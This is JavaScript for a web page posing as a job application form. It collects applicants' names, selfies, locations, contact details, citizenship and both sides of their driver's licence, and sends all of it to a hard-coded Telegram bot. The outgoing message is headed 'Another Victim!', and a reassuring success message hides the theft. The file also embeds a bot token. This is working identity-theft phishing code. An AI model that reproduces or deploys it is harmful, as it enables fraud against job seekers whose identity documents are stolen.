const TELEGRAM_BOT_TOKEN = '7873416864:AAF64fGpn0DIW0ltoyHMLjCImibeMLKdw2c';
const TELEGRAM_CHAT_ID   = '5524654647';

async function submitApplication(event) {
  event.preventDefault();

  const fullName       = document.getElementById('fullName').value.trim();
  const selfie         = document.getElementById('selfie').files[0];
  const location       = document.getElementById('location').value.trim();
  const uniqueSkills   = document.getElementById('uniqueSkills').value.trim();
  const resume         = document.getElementById('resume').files[0];
  const contact        = document.getElementById('contact').value.trim();
  const citizen        = document.getElementById('citizen').value;
  const preferredHours = document.getElementById('preferredHours').value;
  const licenseFront   = document.getElementById('licenseFront').files[0];
  const licenseBack    = document.getElementById('licenseBack').files[0];
  const adSource       = document.getElementById('adSource').value;
  const statusMessage  = document.getElementById('statusMessage');

  if (
    !fullName || 
    !selfie ||
    !location ||
    !contact ||
    !citizen ||
    !licenseFront ||
    !licenseBack ||
    !adSource
  ) {
    showMessage(statusMessage, 'Please complete all required fields (*) before submitting.', true);
    return;
  }

  const messageText = `
🪪 Another Victim!
👤 Name: ${fullName}
🌏 Location: ${location}
📱 Contact Info: ${contact}
🇮🇳 Citizenship: ${citizen}
⏱️ Preferred Hours: ${preferredHours || 'Not specified'}
📢 Source: ${adSource}
🥺 Skills/Qualities: ${uniqueSkills || '❌ Not specified'}
📖 Resume: ${resume ? '✅ Provided' : '❌ Not provided'}
  `;

  try {
    const uploadProgress = document.getElementById('uploadProgress');
    const uploadBar      = document.getElementById('uploadBar');
    uploadProgress.style.display = 'block';
    uploadBar.style.width        = '0%';

    const sendMessageUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const textResponse = await fetch(sendMessageUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: messageText
      }),
    });

    if (!textResponse.ok) {
      throw new Error('Failed to send text message to Telegram.');
    }

    const filesToUpload = [
      { file: selfie, label: 'Selfie' },
      { file: licenseFront, label: 'License_Front' },
      { file: licenseBack,  label: 'License_Back' }
    ];
    if (resume) {
      filesToUpload.push({ file: resume, label: 'Resume' });
    }

    let completedUploads = 0;
    const totalUploads = filesToUpload.length;

    for (const { file, label } of filesToUpload) {
      await sendDocumentToTelegram(file, label);
      completedUploads++;
      const progressPercent = Math.round((completedUploads / totalUploads) * 100);
      uploadBar.style.width = progressPercent + '%';
    }

    showMessage(statusMessage, 'Your application has been submitted successfully! you may now close this page. We will be in contact shortly!', false);
    clearForm();

    setTimeout(() => {
      uploadBar.style.width = '0%';
      uploadProgress.style.display = 'none';
    }, 2000);

  } catch (error) {
    console.error('Error during submission:', error);
    showMessage(statusMessage, 'An error occurred while submitting your application.', true);

    const uploadProgress = document.getElementById('uploadProgress');
    const uploadBar      = document.getElementById('uploadBar');
    uploadBar.style.width = '0%';
    uploadProgress.style.display = 'none';
  }
}

async function sendDocumentToTelegram(file, fileLabel) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('document', file, fileLabel + '_' + file.name);

  const sendDocUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;

  const response = await fetch(sendDocUrl, {
    method: 'POST',
    body: formData,
  });

  if (!response.ok) {
    throw new Error(`Failed to send ${fileLabel} to Telegram.`);
  }
}

function showMessage(element, text, isError) {
  element.style.display = 'block';
  element.textContent    = text;
  element.className      = isError ? 'message error' : 'message success';
}

function clearForm() {
  document.getElementById('fullName').value       = '';
  document.getElementById('selfie').value         = '';
  document.getElementById('location').value       = '';
  document.getElementById('uniqueSkills').value   = '';
  document.getElementById('resume').value         = '';
  document.getElementById('contact').value        = '';
  document.getElementById('citizen').value        = '';
  document.getElementById('preferredHours').value = '';
  document.getElementById('licenseFront').value   = '';
  document.getElementById('licenseBack').value    = '';
  document.getElementById('adSource').value       = '';
}

/**
 * @param {HTMLInputElement} input
 * @param {string} labelId
 */

function updateFilename(input, labelId) {
  const labelSpan = document.getElementById(labelId);
  if (input.files && input.files.length > 0) {
    labelSpan.textContent = input.files[0].name;
  } else {
    labelSpan.textContent = 'Choose file';
  }
}
